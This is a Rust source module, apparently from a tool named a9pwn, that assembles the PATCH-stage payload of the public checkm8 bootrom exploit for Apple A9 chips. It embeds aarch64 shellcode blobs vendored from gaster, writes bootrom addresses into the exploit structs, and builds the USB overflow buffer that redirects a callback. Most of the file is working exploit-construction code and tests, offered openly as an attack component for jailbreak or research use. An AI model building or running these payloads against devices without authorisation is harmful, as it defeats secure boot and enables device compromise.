//! The two vendored aarch64 blobs, and the bytes `PATCH` uploads.
//!
//! `INTERFACE.md` §3. Both blobs are `machine code || placeholder literal pool`
//! (see `payloads/README.md`): at build time the pool is thrown away and a real
//! struct of exactly the same byte length is appended in its place, so every
//! PC-relative load in the code resolves to a field. Get the length wrong and
//! the struct lands at the wrong offset and *every* load reads the wrong field —
//! which is why [`A9_STRUCT_SIZE`] and [`HANDLE_CHECKM8_STRUCT_SIZE`] are
//! asserted here against the real blob lengths and against the placeholder
//! pool's own contents.
//!
//! Nothing in this module talks to a device.

use crate::config::{PayloadKind, SocConfig};

/// `sizeof(A9)` in gaster — `uint64_t pwnd[2]` plus 11 `u64`s = 13 × 8
/// (gaster.c:1010-1012). Load-bearing.
pub const A9_STRUCT_SIZE: usize = 104;

/// `sizeof(handle_checkm8_request)` — 7 `u64`s (gaster.c:1019-1021).
pub const HANDLE_CHECKM8_STRUCT_SIZE: usize = 56;

/// `sizeof(checkm8_overwrite_t)`, i.e. one `dfu_callback_t`:
/// `2 × u32 + u64 + 4 × u32 + 2 × u64` (gaster.c:91-96, 111-113).
pub const OVERWRITE_STRUCT_SIZE: usize = 48;

/// Offset of `dfu_callback_t::callback` inside the overwrite struct
/// (gaster.c:94-95: `uint32_t status, io_len, ret_cnt, pad_1` then the callback).
pub const OVERWRITE_CALLBACK_OFF: usize = 32;

/// aarch64 shellcode uploaded by PATCH. Vendored from gaster (Apache-2.0).
pub const PAYLOAD_A9: &[u8] = include_bytes!("../payloads/payload_A9.bin");

/// The interface-request handler that keeps the bootrom alive after the pwn.
pub const PAYLOAD_HANDLE_CHECKM8_REQUEST: &[u8] =
    include_bytes!("../payloads/payload_handle_checkm8_request.bin");

/// SHA-256 of `payload_A9.bin`, as vendored and re-verified on disk
/// (`payloads/README.md`).
pub const A9_BLOB_SHA256: &str =
    "A698045FAE09ACDC5BFAFC26EF3FE7848F1454B8CE8847FDC45396CC18A532B2";

/// SHA-256 of `payload_handle_checkm8_request.bin`.
pub const HANDLE_BLOB_SHA256: &str =
    "C0C213047A8902186392396CB7E57C096626B4812B61E07C2CF7CF6B99A9889C";

/// Vendored blob lengths. Pinned separately from the struct sizes so a blob
/// swap that happened to preserve one of them still fails.
pub const A9_BLOB_LEN: usize = 280;
pub const HANDLE_BLOB_LEN: usize = 248;

/// Machine code left once the placeholder pool is stripped: 280 − 104 = 176
/// (gaster's `payload_sz`, gaster.c:1045).
pub const A9_CODE_LEN: usize = A9_BLOB_LEN - A9_STRUCT_SIZE;
/// 248 − 56 = 192 (gaster.c:1069).
pub const HANDLE_CODE_LEN: usize = HANDLE_BLOB_LEN - HANDLE_CHECKM8_STRUCT_SIZE;

/// gaster's `EXEC_MAGIC` (gaster.c:50).
pub const EXEC_MAGIC: u64 = 0x6578656365786563;
/// gaster's `DONE_MAGIC` (gaster.c:49).
pub const DONE_MAGIC: u64 = 0x646F6E65646F6E65;
/// gaster's `MEMC_MAGIC` (gaster.c:51).
pub const MEMC_MAGIC: u64 = 0x6D656D636D656D63;

/// One decoded struct field, for `a9pwn plan` to print.
///
/// `off` is the field's offset **inside `BuiltPayload::blob`** — the buffer that
/// actually gets uploaded — so the table reads as a map of the transfer. The
/// struct-relative offset is recoverable from the blob layout below.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FieldTrace {
    pub off: usize,
    pub len: usize,
    pub label: &'static str,
    pub value: u64,
}

/// Everything PATCH needs, already assembled.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BuiltPayload {
    /// The complete upload buffer — gaster's `data` (gaster.c:1071-1134):
    /// `payload_A9 code || A9 struct || handle code || handle struct`.
    pub blob: Vec<u8>,
    /// The overflow buffer — gaster's `checkm8_overwrite` (gaster.c:1192-1196).
    pub overwrite: Vec<u8>,
    /// Every struct field, in offset order, with absolute blob offsets.
    pub fields: Vec<FieldTrace>,
    /// Lowercase hex SHA-256 of `blob` (the bytes actually sent).
    pub blob_sha256: String,
}

/// Check one blob against its vendored length and SHA-256.
///
/// Public so the corruption test can exercise the comparison without a second
/// copy of the embedded blobs, and so `selftest` can verify a blob it read from
/// disk against the same oracle.
pub fn verify_blob(
    name: &str,
    bytes: &[u8],
    expected_sha256: &str,
    expected_len: usize,
) -> Result<(), String> {
    if bytes.len() != expected_len {
        return Err(format!(
            "{name}: {} bytes, expected {expected_len}. The blob length is part of the payload \
             layout (payloads/README.md); a different length means a different exploit.",
            bytes.len()
        ));
    }
    let got = sha256_hex(bytes);
    if !got.eq_ignore_ascii_case(expected_sha256) {
        return Err(format!(
            "{name}: sha256 {got}, expected {expected_sha256}. A swapped blob is a silently \
             different exploit; refusing to build."
        ));
    }
    Ok(())
}

/// Verify both embedded blobs. Fails loudly on any mismatch.
pub fn verify_blob_hashes() -> Result<(), String> {
    verify_blob("payload_A9.bin", PAYLOAD_A9, A9_BLOB_SHA256, A9_BLOB_LEN)?;
    verify_blob(
        "payload_handle_checkm8_request.bin",
        PAYLOAD_HANDLE_CHECKM8_REQUEST,
        HANDLE_BLOB_SHA256,
        HANDLE_BLOB_LEN,
    )?;
    Ok(())
}

/// The two PATCH-stage addresses that `INTERFACE.md` §3's `SocConfig` does not
/// carry but `handle_checkm8_request` needs: `handle_interface_request`
/// (gaster.c:638 for 0x8003, gaster.c:655 for 0x8000, written at gaster.c:1126)
/// and `usb_core_do_transfer` (gaster.c:635 / gaster.c:652, written at
/// gaster.c:1132).
///
/// Keyed by CPID with no fallback: an unknown die is an error, because a wrong
/// value here is a later stage of the exploit executing somewhere invalid.
pub fn handle_request_addrs(cpid: u32) -> Result<(u64, u64), String> {
    match cpid {
        // (handle_interface_request, usb_core_do_transfer)
        0x8003 => Ok((0x10000F1B0, 0x10000EE78)), // gaster.c:638, gaster.c:635
        0x8000 => Ok((0x10000F1B0, 0x10000EE78)), // gaster.c:655, gaster.c:652
        other => Err(format!(
            "no handle_checkm8_request addresses for CPID 0x{other:04X}. Only the A9 dies \
             0x8000 and 0x8003 have them here (gaster.c:635-638, 652-655)."
        )),
    }
}

/// Build the PATCH upload buffer, the overflow buffer, and the field trace.
///
/// Mirrors gaster's `checkm8_stage_patch` byte for byte for the A9 path
/// (gaster.c:1042-1229): the buffer is
/// `payload_A9[..176] || A9 || payload_handle[..192] || handle_checkm8_request`,
/// and the overflow is one zeroed `dfu_callback_t` whose `callback` field is
/// `insecure_memory_base`.
pub fn build_payload(cfg: &SocConfig, kind: PayloadKind) -> Result<BuiltPayload, String> {
    // A swapped blob must never be built into something we then send.
    verify_blob_hashes()?;

    match kind {
        PayloadKind::A9 => {
            if cfg.cpid != 0x8003 && cfg.cpid != 0x8000 {
                return Err(format!(
                    "config {} has CPID 0x{:04X} but the A9 payload is only valid for the A9 \
                     dies 0x8003/0x8000 (gaster.c:1042).",
                    cfg.name, cfg.cpid
                ));
            }
            build_a9(cfg)
        }
        PayloadKind::NotA9 | PayloadKind::NotA9Armv7 => Err(format!(
            "payload kind {} needs gaster's payload_notA9{}.bin, which is not vendored in this \
             crate (payloads/README.md vendors only the two A9 blobs). Refusing to build a \
             payload we do not have.",
            kind.name(),
            if kind == PayloadKind::NotA9Armv7 { "_armv7" } else { "" }
        )),
    }
}

/// `pwnd_str` written into the zeroed 16-byte `pwnd` field, little-endian
/// (gaster.c:1109-1110, gaster.c:154).
fn pwnd_words(cfg: &SocConfig) -> Result<(u64, u64), String> {
    let bytes = cfg.pwnd_bytes();
    if bytes.len() > 16 {
        return Err(format!(
            "pwnd_string is {} bytes; the field is only 16 (uint64_t pwnd[2])",
            bytes.len()
        ));
    }
    let mut field = [0u8; 16];
    field[..bytes.len()].copy_from_slice(bytes);
    let lo = u64::from_le_bytes(field[..8].try_into().unwrap());
    let hi = u64::from_le_bytes(field[8..].try_into().unwrap());
    Ok((lo, hi))
}

fn build_a9(cfg: &SocConfig) -> Result<BuiltPayload, String> {
    let (handle_interface_request, usb_core_do_transfer) = handle_request_addrs(cfg.cpid)?;
    let (pwnd_lo, pwnd_hi) = pwnd_words(cfg)?;

    let a9_code = &PAYLOAD_A9[..A9_CODE_LEN];
    let handle_code = &PAYLOAD_HANDLE_CHECKM8_REQUEST[..HANDLE_CODE_LEN];

    // gaster.c:1111 — payload_dest = boot_tramp_end - handle_code - handle_struct
    //                             = boot_tramp_end - A9.payload_sz
    //                             = 0x1800E1000 - 192 - 56
    //                             = 0x1800E0F08
    // The 56 is subtracted once, not twice: `payload_sz` (192) is the handle
    // *code* only, so the struct has to come off separately. The check that
    // proves it: payload_dest + 192 + 56 == boot_tramp_end exactly.
    //
    // Divergence, documented not hidden: ipwndfu hardcodes PAYLOAD_DEST =
    // 0x1800E0C00 (checkm8.py:592) — a different lineage that also fits below
    // boot_tramp_end. Both are self-consistent and neither is hardware-verified
    // for 0x8003 yet; this is gaster's value, and it is the one a9ctl also had.
    let payload_dest = cfg
        .boot_tramp_end
        .checked_sub((HANDLE_CODE_LEN + HANDLE_CHECKM8_STRUCT_SIZE) as u64)
        .ok_or_else(|| {
            format!(
                "boot_tramp_end 0x{:X} is smaller than the handler ({} bytes): underflow",
                cfg.boot_tramp_end,
                HANDLE_CODE_LEN + HANDLE_CHECKM8_STRUCT_SIZE
            )
        })?;

    // gaster.c:1114-1115. These are offsets *inside the uploaded buffer*, which
    // is exactly why the struct sizes are load-bearing.
    let payload_off = (A9_CODE_LEN + A9_STRUCT_SIZE) as u64;
    let payload_sz = (HANDLE_CODE_LEN + HANDLE_CHECKM8_STRUCT_SIZE) as u64;

    let mut a9 = [0u8; A9_STRUCT_SIZE];
    let mut put = |off: usize, v: u64| a9[off..off + 8].copy_from_slice(&v.to_le_bytes());
    put(0x00, pwnd_lo); // pwnd[0]
    put(0x08, pwnd_hi); // pwnd[1]
    put(0x10, payload_dest); // gaster.c:1111
    put(0x18, cfg.dfu_handle_bus_reset); // gaster.c:1112
    put(0x20, cfg.dfu_handle_request); // gaster.c:1113
    put(0x28, payload_off); // gaster.c:1114
    put(0x30, payload_sz); // gaster.c:1115
    put(0x38, cfg.memcpy_addr); // gaster.c:1116
    put(0x40, cfg.g_usb_serial_number); // gaster.c:1117
    put(0x48, cfg.usb_create_string_descriptor); // gaster.c:1118
    put(0x50, cfg.usb_serial_number_string_descriptor); // gaster.c:1119
    put(0x58, cfg.ttbr0_vrom_addr()); // gaster.c:1120
    put(0x60, cfg.patch_addr); // gaster.c:1121

    let mut handle = [0u8; HANDLE_CHECKM8_STRUCT_SIZE];
    let mut put_h = |off: usize, v: u64| handle[off..off + 8].copy_from_slice(&v.to_le_bytes());
    put_h(0x00, handle_interface_request); // gaster.c:1126
    put_h(0x08, cfg.insecure_memory_base); // gaster.c:1127
    put_h(0x10, EXEC_MAGIC); // gaster.c:1128
    put_h(0x18, DONE_MAGIC); // gaster.c:1129
    put_h(0x20, MEMC_MAGIC); // gaster.c:1130
    put_h(0x28, cfg.memcpy_addr); // gaster.c:1131
    put_h(0x30, usb_core_do_transfer); // gaster.c:1132

    let mut blob = Vec::with_capacity(
        A9_CODE_LEN + A9_STRUCT_SIZE + HANDLE_CODE_LEN + HANDLE_CHECKM8_STRUCT_SIZE,
    );
    blob.extend_from_slice(a9_code);
    let a9_off = blob.len();
    blob.extend_from_slice(&a9);
    let handle_code_off = blob.len();
    blob.extend_from_slice(handle_code);
    let handle_off = blob.len();
    blob.extend_from_slice(&handle);

    debug_assert_eq!(a9_off, A9_CODE_LEN);
    debug_assert_eq!(handle_code_off, payload_off as usize);
    debug_assert_eq!(handle_off, payload_off as usize + HANDLE_CODE_LEN);

    let mut overwrite = vec![0u8; OVERWRITE_STRUCT_SIZE];
    overwrite[OVERWRITE_CALLBACK_OFF..OVERWRITE_CALLBACK_OFF + 8]
        .copy_from_slice(&cfg.insecure_memory_base.to_le_bytes()); // gaster.c:1194

    let fields = vec![
        field(&blob, a9_off + 0x00, "A9.pwnd[0]"),
        field(&blob, a9_off + 0x08, "A9.pwnd[1]"),
        field(&blob, a9_off + 0x10, "A9.payload_dest"),
        field(&blob, a9_off + 0x18, "A9.dfu_handle_bus_reset"),
        field(&blob, a9_off + 0x20, "A9.dfu_handle_request"),
        field(&blob, a9_off + 0x28, "A9.payload_off"),
        field(&blob, a9_off + 0x30, "A9.payload_sz"),
        field(&blob, a9_off + 0x38, "A9.memcpy_addr"),
        field(&blob, a9_off + 0x40, "A9.gUSBSerialNumber"),
        field(&blob, a9_off + 0x48, "A9.usb_create_string_descriptor"),
        field(&blob, a9_off + 0x50, "A9.usb_serial_number_string_descriptor"),
        field(&blob, a9_off + 0x58, "A9.ttbr0_vrom_addr"),
        field(&blob, a9_off + 0x60, "A9.patch_addr"),
        field(&blob, handle_off + 0x00, "handle.handle_interface_request"),
        field(&blob, handle_off + 0x08, "handle.insecure_memory_base"),
        field(&blob, handle_off + 0x10, "handle.exec_magic"),
        field(&blob, handle_off + 0x18, "handle.done_magic"),
        field(&blob, handle_off + 0x20, "handle.memc_magic"),
        field(&blob, handle_off + 0x28, "handle.memcpy_addr"),
        field(&blob, handle_off + 0x30, "handle.usb_core_do_transfer"),
    ];

    let blob_sha256 = sha256_hex(&blob);

    Ok(BuiltPayload {
        blob,
        overwrite,
        fields,
        blob_sha256,
    })
}

fn field(blob: &[u8], off: usize, label: &'static str) -> FieldTrace {
    let value = u64::from_le_bytes(blob[off..off + 8].try_into().unwrap());
    FieldTrace {
        off,
        len: 8,
        label,
        value,
    }
}

// ---------------------------------------------------------------------------
// SHA-256
// ---------------------------------------------------------------------------
//
// Hand-rolled because the crate is limited to rusb / libusb1-sys / libc /
// serde / serde_json (INTERFACE.md §0.4) and this is the one primitive the
// closed set does not provide. It is verified against two independent oracles
// in the tests below: the published test vectors, and the SHA-256 of the two
// vendored blobs as recorded in `payloads/README.md`.

const SHA256_K: [u32; 64] = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
];

/// SHA-256 of `data`.
pub fn sha256(data: &[u8]) -> [u8; 32] {
    let mut h: [u32; 8] = [
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab,
        0x5be0cd19,
    ];

    let bit_len = (data.len() as u64).wrapping_mul(8);
    let mut msg = Vec::with_capacity(data.len() + 72);
    msg.extend_from_slice(data);
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&bit_len.to_be_bytes());

    for chunk in msg.chunks_exact(64) {
        let mut w = [0u32; 64];
        for (i, word) in w.iter_mut().take(16).enumerate() {
            *word = u32::from_be_bytes(chunk[i * 4..i * 4 + 4].try_into().unwrap());
        }
        for i in 16..64 {
            let s0 = w[i - 15].rotate_right(7) ^ w[i - 15].rotate_right(18) ^ (w[i - 15] >> 3);
            let s1 = w[i - 2].rotate_right(17) ^ w[i - 2].rotate_right(19) ^ (w[i - 2] >> 10);
            w[i] = w[i - 16]
                .wrapping_add(s0)
                .wrapping_add(w[i - 7])
                .wrapping_add(s1);
        }

        let (mut a, mut b, mut c, mut d, mut e, mut f, mut g, mut hh) =
            (h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7]);
        for i in 0..64 {
            let s1 = e.rotate_right(6) ^ e.rotate_right(11) ^ e.rotate_right(25);
            let ch = (e & f) ^ ((!e) & g);
            let t1 = hh
                .wrapping_add(s1)
                .wrapping_add(ch)
                .wrapping_add(SHA256_K[i])
                .wrapping_add(w[i]);
            let s0 = a.rotate_right(2) ^ a.rotate_right(13) ^ a.rotate_right(22);
            let maj = (a & b) ^ (a & c) ^ (b & c);
            let t2 = s0.wrapping_add(maj);
            hh = g;
            g = f;
            f = e;
            e = d.wrapping_add(t1);
            d = c;
            c = b;
            b = a;
            a = t1.wrapping_add(t2);
        }
        h[0] = h[0].wrapping_add(a);
        h[1] = h[1].wrapping_add(b);
        h[2] = h[2].wrapping_add(c);
        h[3] = h[3].wrapping_add(d);
        h[4] = h[4].wrapping_add(e);
        h[5] = h[5].wrapping_add(f);
        h[6] = h[6].wrapping_add(g);
        h[7] = h[7].wrapping_add(hh);
    }

    let mut out = [0u8; 32];
    for (i, v) in h.iter().enumerate() {
        out[i * 4..i * 4 + 4].copy_from_slice(&v.to_be_bytes());
    }
    out
}

/// Lowercase hex SHA-256 of `data`.
pub fn sha256_hex(data: &[u8]) -> String {
    let d = sha256(data);
    let mut s = String::with_capacity(64);
    for b in d {
        s.push_str(&format!("{b:02x}"));
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::{A9_8000, A9_8003};

    fn u64_at(buf: &[u8], off: usize) -> u64 {
        u64::from_le_bytes(buf[off..off + 8].try_into().unwrap())
    }

    // -- the hash oracle ----------------------------------------------------

    #[test]
    fn sha256_matches_published_vectors() {
        assert_eq!(
            sha256_hex(b""),
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
        assert_eq!(
            sha256_hex(b"abc"),
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
        );
        // 56-byte input: two blocks, exercises the padding boundary.
        assert_eq!(
            sha256_hex(b"abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq"),
            "248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1"
        );
    }

    /// The strongest available check that the SHA-256 above is right: it must
    /// reproduce the hashes the blobs were vendored under.
    #[test]
    fn embedded_blobs_match_their_documented_hashes() {
        verify_blob_hashes().expect("vendored blobs must verify");
        assert_eq!(sha256_hex(PAYLOAD_A9).to_uppercase(), A9_BLOB_SHA256);
        assert_eq!(
            sha256_hex(PAYLOAD_HANDLE_CHECKM8_REQUEST).to_uppercase(),
            HANDLE_BLOB_SHA256
        );
    }

    #[test]
    fn one_corrupted_byte_fails_verification() {
        let mut bad = PAYLOAD_A9.to_vec();
        bad[0] ^= 0x01;
        let e = verify_blob("payload_A9.bin", &bad, A9_BLOB_SHA256, A9_BLOB_LEN).unwrap_err();
        assert!(e.contains("sha256"), "{e}");

        let mut short = PAYLOAD_HANDLE_CHECKM8_REQUEST.to_vec();
        short.pop();
        let e = verify_blob(
            "payload_handle_checkm8_request.bin",
            &short,
            HANDLE_BLOB_SHA256,
            HANDLE_BLOB_LEN,
        )
        .unwrap_err();
        assert!(e.contains("247 bytes, expected 248"), "{e}");
    }

    // -- the load-bearing layout -------------------------------------------

    #[test]
    fn struct_sizes_are_thirteen_and_seven_words() {
        assert_eq!(A9_STRUCT_SIZE, 13 * 8);
        assert_eq!(HANDLE_CHECKM8_STRUCT_SIZE, 7 * 8);
        assert_eq!(PAYLOAD_A9.len(), A9_BLOB_LEN);
        assert_eq!(PAYLOAD_HANDLE_CHECKM8_REQUEST.len(), HANDLE_BLOB_LEN);
        assert_eq!(A9_STRUCT_SIZE as usize, PAYLOAD_A9.len() - A9_CODE_LEN);
        assert_eq!(
            HANDLE_CHECKM8_STRUCT_SIZE,
            PAYLOAD_HANDLE_CHECKM8_REQUEST.len() - HANDLE_CODE_LEN
        );
        assert_eq!(A9_CODE_LEN, 176);
        assert_eq!(HANDLE_CODE_LEN, 192);
        assert_eq!(OVERWRITE_STRUCT_SIZE, 48);
        assert_eq!(OVERWRITE_CALLBACK_OFF, 32);
    }

    /// The placeholder pool must still be exactly where the struct goes.
    /// MEASURED against the vendored bytes: `payloads/README.md` claims the pool
    /// holds `0x7FFFFFF0..` and that the struct replaces it, and that is the
    /// whole reason the sizes matter.
    #[test]
    fn placeholder_pools_are_where_the_structs_land() {
        assert_eq!(
            &PAYLOAD_A9[A9_CODE_LEN..A9_CODE_LEN + 16],
            b" PWND:[checkm8]\0"
        );
        for i in 0..11u64 {
            assert_eq!(
                u64_at(PAYLOAD_A9, A9_CODE_LEN + 16 + i as usize * 8),
                0x7FFF_FFF0 + i,
                "A9 pool slot {i} moved"
            );
        }
        for i in 0..7u64 {
            assert_eq!(
                u64_at(PAYLOAD_HANDLE_CHECKM8_REQUEST, HANDLE_CODE_LEN + i as usize * 8),
                0x7FFF_FFF0 + i,
                "handle pool slot {i} moved"
            );
        }
    }

    // -- the payload itself -------------------------------------------------

    #[test]
    fn a9_struct_fields_are_exactly_gaster_for_8003() {
        let built = build_payload(&A9_8003, PayloadKind::A9).unwrap();
        assert_eq!(built.blob.len(), 528, "176 + 104 + 192 + 56");
        let b = &built.blob;

        assert_eq!(&b[0xB0..0xC0], b" PWND:[checkm8]\0"); // gaster.c:1109-1110
        assert_eq!(
            u64_at(b, 0xB0),
            0x635B3A444E575020,
            "pwnd[0] = \" PWND:[c\" (gaster.c:154)"
        );
        assert_eq!(
            u64_at(b, 0xB8),
            0x005D386D6B636568,
            "pwnd[1] = \"heckm8]\\0\""
        );
        // payload_dest = 0x1800E1000 - 192 - 56 = 0x1800E0F08 (gaster.c:1111)
        assert_eq!(u64_at(b, 0xC0), 0x1800E0F08);
        assert_eq!(u64_at(b, 0xC8), 0x180087928, "dfu_handle_bus_reset");
        assert_eq!(u64_at(b, 0xD0), 0x1800878F8, "dfu_handle_request");
        assert_eq!(u64_at(b, 0xD8), 280, "payload_off = 176 + 104");
        assert_eq!(u64_at(b, 0xE0), 248, "payload_sz = 192 + 56");
        assert_eq!(u64_at(b, 0xE8), 0x100011030, "memcpy_addr");
        assert_eq!(u64_at(b, 0xF0), 0x180087958, "gUSBSerialNumber");
        assert_eq!(u64_at(b, 0xF8), 0x10000E354, "usb_create_string_descriptor");
        assert_eq!(
            u64_at(b, 0x100),
            0x1800807DA,
            "usb_serial_number_string_descriptor"
        );
        assert_eq!(u64_at(b, 0x108), 0x1800C8400, "ttbr0_addr + 0x400");
        assert_eq!(u64_at(b, 0x110), 0x10000812C, "patch_addr");
    }

    /// The handle struct, and the invariant that makes `payload_off` mean
    /// something: the offsets the A9 struct advertises must be the offsets the
    /// bytes were actually written at.
    #[test]
    fn handle_struct_and_advertised_offsets_agree_for_8003() {
        let built = build_payload(&A9_8003, PayloadKind::A9).unwrap();
        let b = &built.blob;

        let payload_off = u64_at(b, 0xD8) as usize;
        let payload_sz = u64_at(b, 0xE0) as usize;
        assert_eq!(payload_off, 0x118, "handle code starts after A9 struct");
        assert_eq!(payload_sz, HANDLE_BLOB_LEN);
        assert_eq!(
            &b[payload_off..payload_off + HANDLE_CODE_LEN],
            &PAYLOAD_HANDLE_CHECKM8_REQUEST[..HANDLE_CODE_LEN],
            "A9.payload_off must point at the handler code"
        );
        assert!(
            b[payload_off + payload_sz..].is_empty(),
            "A9.payload_sz must cover exactly to the end of the buffer"
        );

        let h = payload_off + HANDLE_CODE_LEN;
        assert_eq!(u64_at(b, h + 0x00), 0x10000F1B0, "handle_interface_request");
        assert_eq!(u64_at(b, h + 0x08), 0x180380000, "insecure_memory_base");
        assert_eq!(u64_at(b, h + 0x10), EXEC_MAGIC);
        assert_eq!(u64_at(b, h + 0x18), DONE_MAGIC);
        assert_eq!(u64_at(b, h + 0x20), MEMC_MAGIC);
        assert_eq!(u64_at(b, h + 0x28), 0x100011030, "memcpy_addr");
        assert_eq!(u64_at(b, h + 0x30), 0x10000EE78, "usb_core_do_transfer");
    }

    /// The A9 code is copied through untouched; only the pool is replaced.
    #[test]
    fn code_sections_are_copied_verbatim() {
        for cfg in [A9_8003, A9_8000] {
            let built = build_payload(&cfg, PayloadKind::A9).unwrap();
            assert_eq!(&built.blob[..A9_CODE_LEN], &PAYLOAD_A9[..A9_CODE_LEN]);
            assert_eq!(
                &built.blob[0x118..0x118 + HANDLE_CODE_LEN],
                &PAYLOAD_HANDLE_CHECKM8_REQUEST[..HANDLE_CODE_LEN]
            );
        }
    }

    #[test]
    fn both_a9_dies_build_the_same_bytes() {
        let a = build_payload(&A9_8003, PayloadKind::A9).unwrap();
        let b = build_payload(&A9_8000, PayloadKind::A9).unwrap();
        assert_eq!(a.blob, b.blob, "gaster.c:624-657: identical addresses");
        assert_eq!(a.blob_sha256, b.blob_sha256);
    }

    /// The built buffer's digest, pinned. If any field, offset or byte order
    /// changes, this fails with the new digest in the message.
    ///
    /// The value was cross-checked by an independent implementation (PowerShell
    /// / .NET SHA-256 over a buffer assembled straight from the two vendored
    /// blobs and `gaster.c:1108-1134`'s field values), not merely copied out of
    /// this crate's own output.
    #[test]
    fn built_blob_digest_is_pinned() {
        let built = build_payload(&A9_8003, PayloadKind::A9).unwrap();
        assert_eq!(built.blob_sha256.len(), 64);
        assert_eq!(built.blob_sha256, sha256_hex(&built.blob));
        assert_eq!(
            built.blob_sha256,
            "c4fb5fd4b799ae7c5901634e2f75503aaad8cb1a9c663e2a1eb703bbeab4b345",
            "built-blob digest changed; re-derive it only against gaster.c:1108-1134"
        );
    }

    #[test]
    fn overwrite_is_the_callback_and_nothing_else() {
        let built = build_payload(&A9_8003, PayloadKind::A9).unwrap();
        assert_eq!(built.overwrite.len(), OVERWRITE_STRUCT_SIZE);
        assert_eq!(
            u64_at(&built.overwrite, OVERWRITE_CALLBACK_OFF),
            0x180380000,
            "gaster.c:1194"
        );
        for (i, byte) in built.overwrite.iter().enumerate() {
            if (OVERWRITE_CALLBACK_OFF..OVERWRITE_CALLBACK_OFF + 8).contains(&i) {
                continue;
            }
            assert_eq!(*byte, 0, "overwrite byte {i} must be zero (gaster.c:1193)");
        }
    }

    #[test]
    fn field_trace_covers_every_struct_field_in_offset_order() {
        let built = build_payload(&A9_8003, PayloadKind::A9).unwrap();
        assert_eq!(built.fields.len(), 13 + 7);
        for w in built.fields.windows(2) {
            assert!(
                w[0].off < w[1].off,
                "fields must be in offset order: {} then {}",
                w[0].label,
                w[1].label
            );
        }
        for f in &built.fields {
            assert_eq!(f.len, 8);
            assert_eq!(
                f.value,
                u64_at(&built.blob, f.off),
                "{} does not match the blob",
                f.label
            );
        }
        // Every A9 field is inside the A9 struct, every handle field inside the
        // handle struct: the trace is a map of the upload, not a restatement.
        for f in &built.fields[..13] {
            assert!((0xB0..0x118).contains(&f.off), "{} at 0x{:X}", f.label, f.off);
        }
        for f in &built.fields[13..] {
            assert!(f.off >= 0x1D8, "{} at 0x{:X}", f.label, f.off);
        }
        assert_eq!(built.fields[0].label, "A9.pwnd[0]");
        assert_eq!(built.fields[0].off, 0xB0);
        assert_eq!(built.fields[12].label, "A9.patch_addr");
        assert_eq!(built.fields[12].off, 0x110);
        assert_eq!(built.fields[19].label, "handle.usb_core_do_transfer");
        assert_eq!(built.fields[19].off, 0x208);
    }

    #[test]
    fn non_a9_kinds_are_refused_because_their_blobs_are_not_here() {
        for kind in [PayloadKind::NotA9, PayloadKind::NotA9Armv7] {
            let e = build_payload(&A9_8003, kind).unwrap_err();
            assert!(e.contains("not vendored"), "{e}");
        }
    }

    #[test]
    fn mismatched_cpid_and_kind_is_refused() {
        let mut cfg = A9_8003;
        cfg.cpid = 0x8010;
        let e = build_payload(&cfg, PayloadKind::A9).unwrap_err();
        assert!(e.contains("0x8010"), "{e}");
    }

    #[test]
    fn handle_request_addrs_refuse_unknown_dies() {
        assert_eq!(
            handle_request_addrs(0x8003).unwrap(),
            (0x10000F1B0, 0x10000EE78)
        );
        assert_eq!(
            handle_request_addrs(0x8000).unwrap(),
            (0x10000F1B0, 0x10000EE78)
        );
        let e = handle_request_addrs(0x8960).unwrap_err();
        assert!(e.contains("0x8960"), "{e}");
    }

    #[test]
    fn boot_tramp_underflow_is_reported_not_wrapped() {
        let mut cfg = A9_8003;
        cfg.boot_tramp_end = 0x10;
        let e = build_payload(&cfg, PayloadKind::A9).unwrap_err();
        assert!(e.contains("underflow"), "{e}");
    }

    #[test]
    fn oversized_pwnd_string_is_refused() {
        let mut cfg = A9_8003;
        cfg.pwnd_string = Box::leak("x".repeat(17).into_boxed_str());
        let e = build_payload(&cfg, PayloadKind::A9).unwrap_err();
        assert!(e.contains("16"), "{e}");
    }

    /// `payload_dest` is derived, and the derivation has an exact check:
    /// `payload_dest + handle_code + handle_struct == boot_tramp_end`. gaster
    /// (gaster.c:1111) gives 0x1800E0F08; ipwndfu's hardcoded 0x1800E0C00
    /// (checkm8.py:592) is a different lineage, recorded here so nobody
    /// "corrects" this one to it.
    #[test]
    fn payload_dest_is_gasters_not_ipwndfus() {
        let built = build_payload(&A9_8003, PayloadKind::A9).unwrap();
        let dest = u64::from_le_bytes(built.blob[0xC0..0xC8].try_into().unwrap());
        assert_eq!(dest, 0x1800E0F08);
        assert_eq!(dest, A9_8003.boot_tramp_end - 248);
        assert_eq!(
            dest + HANDLE_CODE_LEN as u64 + HANDLE_CHECKM8_STRUCT_SIZE as u64,
            A9_8003.boot_tramp_end,
            "the handler must end exactly at boot_tramp_end"
        );
